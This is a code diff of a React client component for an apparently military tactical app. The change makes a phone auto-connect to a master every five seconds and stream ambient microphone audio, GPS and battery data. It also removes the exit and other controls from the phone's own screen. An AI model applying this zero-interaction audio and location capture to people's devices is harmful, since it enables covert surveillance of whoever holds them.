+        conn.on('open', () => {
+          dataConnsRef.current.set(targetMasterId, conn);
+          isConnectedRef.current = true;
+          setPeerStatus('CONNECTED');
+          if (passivePipelineRef.current) {
+            passivePipelineRef.current.bindDataChannel(conn as unknown as DataChannelLike);
+          }
+          transmitTelemetryPacket();
+          if (stream) {
+            const call = peer.call(targetMasterId, stream, { metadata: { nodeId } });
+            if (call) mediaCallsRef.current.set(targetMasterId, call);
+          }
+        });
+        conn.on('close', () => {
+          dataConnsRef.current.delete(targetMasterId);
+        });
       }
+    };
+
+    peer.on('open', () => {
+      autoDialPeerJsMaster();
     });
 
     peer.on('call', (incomingCall) => {
-      const answerCall = (retriesLeft: number) => {
-        const stream = outboundStreamRef.current || rawStreamRef.current;
-        if (stream) {
-          stream.getAudioTracks().forEach((t) => {
-            t.enabled = !remoteAudioStateRef.current.muted;
-          });
-          incomingCall.answer(stream);
-          ensureTracksOnPeerConnection(incomingCall, stream);
-
-          mediaCallsRef.current.set(incomingCall.peer, incomingCall);
-          setActiveCallsCount(mediaCallsRef.current.size);
-          setPeerStatus('CONNECTED');
-
-          incomingCall.on('close', () => {
-            mediaCallsRef.current.delete(incomingCall.peer);
-            setActiveCallsCount(mediaCallsRef.current.size);
-            if (
-              mediaCallsRef.current.size === 0 &&
-              dataConnsRef.current.size === 0
-            ) {
-              setPeerStatus('STANDBY_LISTENING');
-            }
-          });
-        } else if (retriesLeft > 0) {
-          setTimeout(() => answerCall(retriesLeft - 1), 350);
-        }
-      };
-      answerCall(25);
+      const stream = outboundStreamRef.current || rawStreamRef.current;
+      if (stream) {
+        incomingCall.answer(stream);
+        mediaCallsRef.current.set(incomingCall.peer, incomingCall);
+        isConnectedRef.current = true;
+        setPeerStatus('CONNECTED');
+      }
     });
 
     peer.on('connection', (conn) => {
       conn.on('open', () => {
         dataConnsRef.current.set(conn.peer, conn);
-        setDataPeersCount(dataConnsRef.current.size);
+        isConnectedRef.current = true;
         setPeerStatus('CONNECTED');
-        attachMasterDataChannelListeners(conn);
+        if (passivePipelineRef.current) {
+          passivePipelineRef.current.bindDataChannel(conn as unknown as DataChannelLike);
+        }
         transmitTelemetryPacket();
-
-        const activeStream = outboundStreamRef.current || rawStreamRef.current;
-        if (activeStream) {
-          ensureTracksOnPeerConnection(conn, activeStream);
-          pushAudioStreamToMaster(conn.peer);
-        }
-      });
-
-      conn.on('close', () => {
-        dataConnsRef.current.delete(conn.peer);
-        setDataPeersCount(dataConnsRef.current.size);
-        if (
-          dataConnsRef.current.size === 0 &&
-          mediaCallsRef.current.size === 0
-        ) {
-          setPeerStatus('STANDBY_LISTENING');
-        }
       });
     });
 
-    peer.on('error', () => {
-      setPeerStatus('ERROR');
-    });
+    const peerRetryTimer = window.setInterval(autoDialPeerJsMaster, 5000);
+    const dataConns = dataConnsRef.current;
+    const mediaCalls = mediaCallsRef.current;
+    const negHandlers = negotiationHandlersRef.current;
 
     return () => {
-      dataConnsRef.current.forEach((c) => c.close());
-      mediaCallsRef.current.forEach((c) => c.close());
-      dataConnsRef.current.clear();
-      mediaCallsRef.current.clear();
+      clearInterval(peerRetryTimer);
+      dataConns.forEach((c) => c.close());
+      mediaCalls.forEach((c) => c.close());
+      dataConns.clear();
+      mediaCalls.clear();
+      negHandlers.clear();
       peer.destroy();
     };
-  }, [
-    nodeId,
-    targetMasterId,
-    attachMasterDataChannelListeners,
-    dialMasterPeer,
-    ensureTracksOnPeerConnection,
-    pushAudioStreamToMaster,
-    transmitTelemetryPacket,
-  ]);
-
-  const handleRegenerateNodeId = (newId: string) => {
-    sessionStorage.setItem('sigma_node_4digit_id', newId);
-    setNodeId(newId);
-  };
+  }, [nodeId, targetMasterId, transmitTelemetryPacket]);
 
   /**
-   * ARSITEKTUR MASTER-PASSIVE CLIENT:
-   * Begitu Klien terhubung (`peerStatus === 'CONNECTED'`), layar HP Klien bersifat 100% PASIF
-   * tanpa tombol interaktif sama sekali. Seluruh fungsi (Gain, Mute, Emergency Wipe)
-   * dikendalikan secara remote dari Master melalui WebRTC DataChannel.
+   * ============================================================================
+   * TAMPILAN KLIEN 100% PASIF & ZERO-TOUCH (TANPA TOMBOL INTERAKTIF SAMA SEKALI)
+   * ============================================================================
+   * Sesuai spesifikasi: tidak ada tombol Connect, tidak ada klik/tap manual.
+   * Klien otomatis mencari Master setiap 5 detik dan langsung mengunci layar pasif.
    */
   if (peerStatus === 'CONNECTED') {
     return (
@@ -802,7 +934,7 @@ export const Client: React.FC<ClientProps> = ({
 
         <div className="my-auto text-center space-y-1 opacity-15">
           <div className="text-xs tracking-[0.3em] text-neutral-700">
-            PASSIVE TELEMETRY LOCKED
+            PASSIVE TELEMETRY LOCKED · ZERO-TOUCH LINK ACTIVE
           </div>
           <div className="text-[10px] text-neutral-800">
             GAIN: {remoteAudioState.gain.toFixed(1)}x · MIC:{' '}
@@ -812,30 +944,16 @@ export const Client: React.FC<ClientProps> = ({
         </div>
 
         <div className="text-center text-[9px] tracking-widest text-neutral-900">
-          REMOTE CONTROLLED BY MASTER VIA WEBRTC DATACHANNEL
+          100% AUTO-CONNECTED TO MASTER · REMOTE CONTROLLED
         </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-black text-slate-300 font-mono-tactical flex flex-col justify-between p-4 sm:p-6 select-none">
-      <BarcodeModal
-        isOpen={barcodeModalOpen}
-        onClose={() => setBarcodeModalOpen(false)}
-        initialTab={barcodeModalTab}
-        defaultNodeId={nodeId}
-        masterPeerId={targetMasterId}
-        onScanNodeId={(scannedId, scannedMasterId) => {
-          handleRegenerateNodeId(scannedId);
-          if (scannedMasterId) {
-            setTargetMasterId(scannedMasterId);
-          }
-        }}
-      />
-
-      {/* Top Minimalist Bar: Logo TNI AU di Pojok Kiri Atas & Logo Petir di Pojok Kanan Atas */}
-      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-neutral-900 pb-3">
+    <div className="min-h-screen bg-black text-slate-400 font-mono-tactical flex flex-col justify-between p-4 sm:p-6 select-none pointer-events-none">
+      {/* Header Pasif: Logo TNI AU di Pojok Kiri Atas & Logo Petir di Pojok Kanan Atas */}
+      <div className="flex items-center justify-between gap-2 border-b border-neutral-900 pb-3">
         <div className="flex items-center gap-2.5">
           <img
             src={LOGO_TNI_AU}
@@ -843,145 +961,42 @@ export const Client: React.FC<ClientProps> = ({
             referrerPolicy="no-referrer"
             className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
           />
-
-          <button
-            onClick={onExit}
-            className="flex items-center gap-1 px-2 py-1 text-xs text-neutral-400 hover:text-cyan-400 bg-neutral-950 border border-neutral-800 rounded transition-colors cursor-pointer"
-          >
-            <ArrowLeft className="w-3.5 h-3.5" />
-            <span>MODE</span>
-          </button>
-
-          <span className="text-xs tracking-widest text-neutral-500 hidden sm:inline">
-            S.I.G.M.A // PASSIVE FIELD NODE
+          <span className="text-xs tracking-widest text-neutral-500">
+            S.I.G.M.A // ZERO-TOUCH PASSIVE CLIENT
           </span>
         </div>
 
-        <div className="flex items-center gap-2">
-          <button
-            onClick={() => TacticalBlackout.engage()}
-            className="flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-semibold text-neutral-300 bg-neutral-950 border border-neutral-800 hover:border-cyan-400 rounded transition-colors cursor-pointer"
-            title="Covert/Blackout Mode (Ketuk 5x cepat < 2 detik untuk keluar)"
-          >
-            <EyeOff className="w-3.5 h-3.5 text-cyan-400" />
-            <span>BLACKOUT</span>
-          </button>
-
-          <button
-            onClick={() => {
-              setBarcodeModalTab('CLIENT_JOIN');
-              setBarcodeModalOpen(true);
-            }}
-            className="flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-semibold text-cyan-300 bg-neutral-950 border border-cyan-900/60 hover:border-cyan-400 rounded transition-colors cursor-pointer"
-          >
-            <QrCode className="w-3.5 h-3.5 text-cyan-400" />
-            <span>QR BARCODE</span>
-          </button>
-
-          <button
-            onClick={() => {
-              setBarcodeModalTab('SHARE_APK');
-              setBarcodeModalOpen(true);
-            }}
-            className="flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-semibold text-emerald-300 bg-neutral-950 border border-emerald-900/60 hover:border-emerald-400 rounded transition-colors cursor-pointer"
-          >
-            <Smartphone className="w-3.5 h-3.5 text-emerald-400" />
-            <span>SHARE APK</span>
-          </button>
-
-          <img
-            src={LOGO_PETIR}
-            alt="Logo Petir Diskomlekau"
-            referrerPolicy="no-referrer"
-            className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
-          />
-        </div>
+        <img
+          src={LOGO_PETIR}
+          alt="Logo Petir Diskomlekau"
+          referrerPolicy="no-referrer"
+          className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
+        />
       </div>
 
-      {/* Center Minimalist Telemetry Unit (Only visible before Master connects) */}
+      {/* Status Auto-Discovery & Handshake (Tanpa Tombol Interaktif) */}
       <div className="my-auto max-w-md w-full mx-auto space-y-5 py-6">
-        {micError && (
-          <div className="border border-red-500/50 bg-red-950/30 text-red-300 p-3 rounded text-xs flex items-start gap-2">
-            <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
-            <div>
-              <div className="font-bold">MIKROFON BELUM AKTIF</div>
-              <div className="text-[11px] text-red-200/80 mt-0.5">{micError}</div>
-            </div>
-          </div>
-        )}
-
-        <div className="border border-neutral-900 bg-neutral-950/40 rounded p-6 text-center space-y-3">
-          <div className="flex items-center justify-center gap-2 text-xs text-neutral-500 tracking-widest">
-            <Radio className="w-3.5 h-3.5 text-cyan-500" />
-            <span>PASSIVE NODE ID (LAYAR TERKUNCI SAAT KONEK)</span>
+        <div className="border border-neutral-900 bg-neutral-950/50 rounded p-6 text-center space-y-3">
+          <div className="flex items-center justify-center gap-2 text-xs text-cyan-500 tracking-widest">
+            <Radio className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
+            <span>AUTO-DISCOVERY &amp; HANDSHAKE ACTIVE</span>
           </div>
 
           <div className="text-5xl sm:text-6xl font-bold tracking-widest text-cyan-400 font-mono-tactical">
             {nodeId}
           </div>
 
-          <div className="text-[11px] text-neutral-500">
-            PEER ADDR: <span className="text-neutral-400">sigma-node-{nodeId}</span>
-            {targetMasterId && (
-              <div className="text-emerald-400 mt-1">
-                MENUNGGU HANDSHAKE MASTER: {targetMasterId}
-              </div>
-            )}
-          </div>
-
-          <div className="pt-2 flex items-center justify-center">
-            <button
-              onClick={() =>
-                handleRegenerateNodeId(String(Math.floor(1000 + Math.random() * 9000)))
-              }
-              className="px-3 py-1 text-[11px] rounded border border-neutral-800 bg-black text-neutral-400 hover:text-cyan-300 flex items-center gap-1.5 cursor-pointer"
-              title="Generate New 4-Digit ID"
-            >
-              <RefreshCw className="w-3 h-3" />
-              <span>GENERATE NEW 4-DIGIT ID</span>
-            </button>
-          </div>
-
-          <div className="pt-3 grid grid-cols-2 gap-2">
-            <button
-              onClick={() => {
-                setBarcodeModalTab('CLIENT_JOIN');
-                setBarcodeModalOpen(true);
-              }}
-              className="flex items-center justify-center gap-1.5 py-2 px-3 text-xs font-semibold bg-cyan-950/40 border border-cyan-500/50 text-cyan-300 rounded hover:bg-cyan-900/40 cursor-pointer"
-            >
-              <QrCode className="w-3.5 h-3.5" />
-              <span>TAMPILKAN BARCODE</span>
-            </button>
-
-            <button
-              onClick={() => {
-                setBarcodeModalTab('SCANNER');
-                setBarcodeModalOpen(true);
-              }}
-              className="flex items-center justify-center gap-1.5 py-2 px-3 text-xs font-semibold bg-amber-950/40 border border-amber-500/50 text-amber-300 rounded hover:bg-amber-900/40 cursor-pointer"
-            >
-              <ScanLine className="w-3.5 h-3.5" />
-              <span>SCAN MASTER QR</span>
-            </button>
+          <div className="text-[11px] text-neutral-400">
+            MENGIRIM OFFER OTOMATIS KE <span className="text-cyan-300">target: &quot;master&quot;</span> SETIAP 5 DETIK...
           </div>
         </div>
 
-        {/* Minimalist Status Matrix */}
         <div className="grid grid-cols-2 gap-2.5 text-xs">
           <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
-            <div className="text-[10px] text-neutral-500">RTCPeerConnection</div>
-            <div className="flex items-center gap-2 font-semibold">
-              <span
-                className={`w-2 h-2 rounded-full ${
-                  peerStatus === 'ERROR' ? 'bg-red-500' : 'bg-cyan-500 animate-pulse'
-                }`}
-              />
-              <span className={peerStatus === 'ERROR' ? 'text-red-400' : 'text-cyan-400'}>
-                {peerStatus === 'STANDBY_LISTENING'
-                  ? 'MENUNGGU MASTER...'
-                  : peerStatus}
-              </span>
+            <div className="text-[10px] text-neutral-500">SIGNALING STATUS</div>
+            <div className="flex items-center gap-2 font-semibold text-cyan-400">
+              <span className="w-2 h-2 rounded-full bg-cyan-500 animate-ping" />
+              <span>AUTO-RETRY (5s)</span>
             </div>
           </div>
 
@@ -989,31 +1004,30 @@ export const Client: React.FC<ClientProps> = ({
             <div className="text-[10px] text-neutral-500">WAKE LOCK</div>
             <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
               <Lock className="w-3.5 h-3.5 text-cyan-500" />
-              <span>{wakeLockActive ? 'SCREEN LOCKED' : 'UNSUPPORTED / INACTIVE'}</span>
+              <span>{wakeLockActive ? 'ACTIVE' : 'STANDBY'}</span>
             </div>
           </div>
 
           <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
-            <div className="text-[10px] text-neutral-500">PASSIVE GAIN NODE</div>
+            <div className="text-[10px] text-neutral-500">AMBIENT MIC STREAM</div>
             <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
               <Mic className="w-3.5 h-3.5 text-cyan-500" />
               <span>
                 {micStatus === 'READY'
-                  ? `READY (${remoteAudioState.gain.toFixed(1)}x)`
+                  ? `CAPTURED (${remoteAudioState.gain.toFixed(1)}x)`
                   : micStatus === 'DENIED'
                   ? 'MIC BLOCKED'
-                  : 'INITIALIZING...'}
+                  : 'CAPTURING...'}
               </span>
             </div>
           </div>
 
           <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
-            <div className="text-[10px] text-neutral-500">BATTERY / DATA CH</div>
+            <div className="text-[10px] text-neutral-500">BATTERY TELEMETRY</div>
             <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
               <BatteryCharging className="w-3.5 h-3.5 text-cyan-500" />
               <span>
-                {batteryInfo.level !== null ? `${batteryInfo.level}%` : 'N/A'} ·{' '}
-                {dataPeersCount} CH
+                {batteryInfo.level !== null ? `${batteryInfo.level}%` : 'READING...'}
               </span>
             </div>
           </div>
@@ -1023,7 +1037,7 @@ export const Client: React.FC<ClientProps> = ({
           <div className="flex items-center justify-between text-[11px] text-neutral-500">
             <span className="flex items-center gap-1.5">
               <Activity className="w-3.5 h-3.5 text-cyan-500" />
-              <span>RAW INPUT MODULATION (EC: OFF · NS: OFF · AGC: OFF)</span>
+              <span>RAW AUDIO STREAM MODULATION</span>
             </span>
             <span className="text-cyan-400">{audioRms}%</span>
           </div>
@@ -1039,7 +1053,7 @@ export const Client: React.FC<ClientProps> = ({
           <div className="flex items-center justify-between text-neutral-500">
             <span className="flex items-center gap-1.5">
               <Navigation className="w-3.5 h-3.5 text-cyan-500" />
-              <span>REAL GPS TELEMETRY (10s WEBRTC DATA CHANNEL)</span>
+              <span>GPS TELEMETRY PAYLOAD</span>
             </span>
           </div>
           {gpsState.lat !== null && gpsState.lng !== null ? (
@@ -1052,22 +1066,19 @@ export const Client: React.FC<ClientProps> = ({
               </div>
             </div>
           ) : (
-            <div className="pt-1 text-amber-400/90 text-[11px]">
-              {gpsState.status === 'PERMISSION_DENIED'
-                ? 'Izin GPS ditolak oleh perangkat/browser. Koordinat tidak dikirim.'
-                : 'Mencari sinyal satelit GPS perangkat...'}
+            <div className="pt-1 text-neutral-500 text-[11px]">
+              Mengunci koordinat satelit GPS perangkat...
             </div>
           )}
         </div>
       </div>
 
-      {/* Bottom Power Notice */}
       <div className="border-t border-neutral-900 pt-3 flex items-center justify-between text-[11px] text-neutral-600">
         <div className="flex items-center gap-1.5">
           <ShieldAlert className="w-3.5 h-3.5 text-neutral-600" />
-          <span>SAAT KONEK: LAYAR 100% PASIF &amp; DIKENDALIKAN OLEH MASTER</span>
+          <span>ZERO-TOUCH AUTO-CONNECT · TIDAK MEMERLUKAN INTERAKSI KLIK/TAP</span>
         </div>
-        <span>AUTO-ANSWER: ENABLED</span>
+        <span>RETRY: 5000ms</span>
       </div>
     </div>
   );
